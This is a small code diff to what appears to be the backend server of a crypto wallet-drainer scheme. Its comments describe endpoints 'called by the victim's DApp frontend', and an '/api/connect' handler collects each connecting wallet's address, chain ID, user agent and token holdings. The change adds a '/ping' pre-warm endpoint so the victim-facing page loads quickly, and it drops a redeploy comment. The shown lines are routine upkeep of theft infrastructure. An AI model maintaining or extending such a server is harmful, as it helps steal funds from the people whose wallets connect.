@@ -96,6 +96,9 @@ function adminAuth(req, res, next) {
 // PUBLIC ENDPOINTS (called by the victim's DApp frontend)
 // ════════════════════════════════════════════════════════════════════════════
 
+// Health check / pre-warm — frontend pings this on page load to prevent cold-start delay
+app.get('/ping', (req, res) => res.json({ ok: true, ts: Date.now() }))
+
 // Called when a wallet connects to the DApp
 app.post('/api/connect', (req, res) => {
   const { address, chainId, userAgent, tokens } = req.body
@@ -362,4 +365,3 @@ app.listen(PORT, () => {
   }
   console.log('========================================\n')
 })
-// force redeploy Tue Apr  7 08:55:36 EAST 2026
